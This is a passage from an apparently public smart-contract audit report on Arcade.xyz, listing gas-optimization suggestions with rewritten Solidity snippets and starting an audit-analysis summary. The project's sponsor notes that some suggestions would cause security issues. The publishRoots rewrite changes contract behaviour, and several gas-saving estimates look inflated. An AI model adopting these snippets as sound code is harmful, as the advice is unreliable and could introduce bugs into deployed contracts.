{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AT_MintingCapExceeded</span><span class=\"mtk1\">(</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">mintCapAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">mintingAllowedAfter</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">MIN_TIME_BETWEEN_MINTS</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 5000 to 10000 gas per transaction, depending on the gas cost of the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeToken.sol#L153C3-L157C10\">totalSupply</a> function call and the multiplication and division operations.</p>\n<h2 id=\"possible-optimization-in-arcadetokendistributorsol\" style=\"position:relative;\"><a href=\"#possible-optimization-in-arcadetokendistributorsol\" aria-label=\"possible optimization in arcadetokendistributorsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization in <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeTokenDistributor.sol\">ArcadeTokenDistributor.sol</a></h2>\n<p>This contract uses separate <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeTokenDistributor.sol#L34C5-L59C36\">boolean</a> flags to track if each <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeTokenDistributor.sol#L34C5-L59C36\">distribution</a> has been sent. These flags could be combined into a single <code>uint256</code> (or <code>uint8</code> for even more gas savings) with each bit representing a different <code>distribution</code>. This would save gas by reducing the number of storage slots used.</p>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeTokenDistributor.sol#L73C1-L82C6\">Before Optimization</a> </p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Combine distribution flags into a single uint8</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionsSent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">toTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_treasury</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check if the treasury distribution has not been sent (first bit of distributionsSent is 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// and if the _treasury address is not zero</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">((</span><span class=\"mtk12\">distributionsSent</span><span class=\"mtk1\"> &amp; </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">_treasury</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;AT_AlreadySent or zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Set the first bit of distributionsSent to 1 (indicating that the treasury distribution has been sent)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">distributionsSent</span><span class=\"mtk1\"> |= </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Transfer the treasury amount of tokens to the _treasury address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">arcadeToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_treasury</span><span class=\"mtk1\">, </span><span class=\"mtk12\">treasuryAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Emit a Distribute event</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Distribute</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">arcadeToken</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_treasury</span><span class=\"mtk1\">, </span><span class=\"mtk12\">treasuryAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 5000 to 20000 gas per transaction, depending on the number of distributions. This is because the <code>SSTORE</code> opcode, which is used to update storage, is one of the most expensive operations in terms of gas cost. By reducing the number of storage slots used, we can save a significant amount of gas. </p>\n<h2 id=\"possible-optimizations-in-reputationbadgesol\" style=\"position:relative;\"><a href=\"#possible-optimizations-in-reputationbadgesol\" aria-label=\"possible optimizations in reputationbadgesol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimizations in <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol\">ReputationBadge.sol</a></h2>\n<h3 id=\"possible-optimization-1-4\" style=\"position:relative;\"><a href=\"#possible-optimization-1-4\" aria-label=\"possible optimization 1 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 1</h3>\n<p>In the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L98C1-L120C6\">mint</a> function, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L105C8-L105C58\">mintPrice</a> is calculated by multiplying <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L105C8-L105C58\">mintPrices[tokenId]</a> with amount. However, this calculation is performed before the checks for <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L106C9-L106C60\">claimExpiration</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L109C13-L109C35\">msg.value &#x3C; mintPrice</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L110C12-L110C26\">_verifyClaim</a>. If any of these checks fail, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L105C8-L105C58\">mintPrice</a> calculation would have been performed unnecessarily. Moving the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L105C8-L105C58\">mintPrice</a> calculation after these checks could save gas in the case where any of these checks fail.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">claimExpiration</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">claimExpirations</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">claimExpiration</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RB_ClaimingExpired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">claimExpiration</span><span class=\"mtk1\">, </span><span class=\"mtk11\">uint48</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">_verifyClaim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalClaimable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RB_InvalidMerkleProof</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amountClaimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">][</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">totalClaimable</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RB_InvalidClaimAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalClaimable</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mintPrices</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] * </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">mintPrice</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RB_InvalidMintFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintPrice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// increment amount claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">amountClaimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">][</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// mint to recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 200 to 500 gas per transaction, depending on the gas cost of the multiplication operation.</p>\n<h3 id=\"possible-optimization-2-4\" style=\"position:relative;\"><a href=\"#possible-optimization-2-4\" aria-label=\"possible optimization 2 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Possible Optimization 2</h3>\n<p>The <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L140C4-L156C6\">publishRoots</a> function uses a loop to update <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L150C11-L150C73\">claimRoots</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L151C10-L151C85\">claimExpirations</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L152C12-L152C73\">mintPrices</a> for each <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L150C38-L150C45\">tokenId</a>. However, the <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L150C38-L150C45\">tokenId</a> is not checked for uniqueness, which means that the same <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L150C38-L150C45\">tokenId</a> could be updated multiple times in a single transaction, wasting gas. Adding a check to ensure that each <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L150C38-L150C45\">tokenId</a> is unique could save gas.</p>\n<p>After Optimization:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">publishRoots</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ClaimData</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BADGE_MANAGER_ROLE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RB_NoClaimData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">50</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RB_ArrayTooLarge</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// uniqueness check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">claimRoots</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RB_TokenIdNotUnique</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// expiration check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">claimExpiration</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RB_InvalidExpiration</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">claimRoot</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">claimRoots</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">claimRoot</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">claimExpirations</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">claimExpiration</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">mintPrices</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">mintPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RootsPublished</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_claimData</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Estimated gas saved:<br>\nThis optimization could save around 5000 to 10000 gas per transaction, depending on the number of <code>tokenIds</code> that are not unique. This is because the <code>SSTORE</code> opcode, which is used to update storage, is one of the most expensive operations in terms of gas cost. By reducing the number of unnecessary <code>SSTORE</code> operations, we can save a significant amount of gas.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/254#issuecomment-1663070978\">PowVT (Arcade.xyz) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>A couple of these optimizations will cause security issues. Marking as acknowledged.</p>\n</blockquote>\n<hr>\n<h1 id=\"audit-analysis\" style=\"position:relative;\"><a href=\"#audit-analysis\" aria-label=\"audit analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit Analysis</h1>\n<p>For this audit, 14 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/455\">report highlighted below</a> by <strong>Sathish9098</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/522\">DadeKuma</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/435\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/427\">ktg</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/394\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/377\">3agle</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/356\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/309\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/305\">foxb868</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/257\">K42</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/181\">0xnev</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/558\">BugBusters</a>, <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/556\">oakcobalt</a>, and <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/376\">squeaky_cactus</a>.</em></p>\n<h2 id=\"audit-analysis-summary\" style=\"position:relative;\"><a href=\"#audit-analysis-summary\" aria-label=\"audit analysis summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit Analysis Summary</h2>\n<table>\n<thead>\n<tr>\n<th align=\"left\">List</th>\n<th align=\"left\">Head</th>\n<th align=\"left\">Details</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\">Overview of Arcade.xyz platform</td>\n<td align=\"left\">Overview of the key components and features of Arcade.xyz</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\">My Thoughts</td>\n<td align=\"left\">My thoughts about future of the this protocol</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\">Audit approach</td>\n<td align=\"left\">Process and steps I followed</td>\n</tr>\n<tr>\n<td align=\"left\">4</td>\n<td align=\"left\">Learnings</td>\n<td align=\"left\">Learnings from this protocol</td>\n</tr>\n<tr>\n<td align=\"left\">5</td>\n<td align=\"left\">Possible Systemic Risks</td>\n<td align=\"left\">The 